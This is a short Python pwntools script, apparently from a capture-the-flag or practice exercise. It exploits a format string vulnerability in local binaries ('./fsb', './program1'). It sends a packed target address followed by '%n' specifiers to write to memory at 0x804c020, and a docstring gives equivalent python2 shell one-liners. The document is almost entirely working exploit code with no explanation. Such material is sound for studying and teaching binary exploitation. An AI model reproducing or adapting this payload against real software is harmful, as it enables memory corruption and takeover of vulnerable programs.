"""
[+]Exploit code
python2 -c " '\x20\xc0\x04\x08' + '%1\$n' " | ./program1 
python2 -c " '\x20\xc0\x04\x08' + '%n%1\$n'" | ./program1
  : n is number for write memory

"""

from pwn import *


secret_address = p32(0x804c020)


for x in range(1,2):
	p = process("./fsb")


	# Memory write
	payload = secret_address
	payload += b'%'+str(x)+'$n'

	p.sendline(payload)

	print(p.recvall())
	print(payload)
	print ("Payload is : %s" % (payload))
	print("current offset %s" %(x))
	print('\n\n')
	p.close()